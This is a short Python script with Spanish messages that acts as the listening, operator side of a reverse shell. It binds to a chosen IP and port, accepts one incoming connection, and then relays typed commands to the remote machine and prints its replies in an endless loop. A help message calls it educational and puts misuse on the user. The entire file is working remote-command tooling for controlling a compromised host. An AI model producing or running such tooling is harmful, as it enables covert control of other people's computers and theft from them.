#!/usr/bin/python3
#-*-coding: utf-8-*-
from socket import *
from sys import argv
from os import system

def h():
	print("Este programa fue creado con fines didacticos, el mal uso dado es responsabilidad del usuario.")
	print("-i: Seguido de esta bandera tienes que poner tu ip privada.")
	print("-p: Despues de este parametro tienes que poner el numero de puerto que se usará.")
	exit()

if __name__ == '__main__':
	if len(argv) < 5 and argv[1] != "-h" or len(argv) > 5:
		print("{} -h para ver las opciones.".format(argv[0]))
		exit()
	else:
		argcount = 0
		ip = str()
		port = 0
		for arg in argv:
			if arg[0] != "-":
				argcount += 1
				continue
			elif arg == "-h":
				h()
			elif arg == "-p":
				try:
					port = int(argv[argcount + 1])
				except:
					print("{} no es un numero valido.".format(argv[argcount + 1]))
					exit()
			elif arg == "-i":
				ip = str(argv[argcount + 1])
			else:
				print("{} no se reconoce como una bandera valida.".format(arg))
				exit()
			argcount += 1
		try:
			sock = socket(AF_INET, SOCK_STREAM)
			sock.bind((ip, port))
			sock.listen(1)
			print("Esperando a establecer una conexión...")
			conn, addr = sock.accept()
			print("Conexión establecida: {}".format(addr))
		except Exception as e: 
			print("Ha habido un problema al iniciar el servidor.\n{}".format(e))
			exit()
		else:
			while True:
				cmd = input(">>>")
				cmd = cmd.lower()
				conn.send(cmd.encode())
				answ = conn.recv(1024).decode()
				print(answ)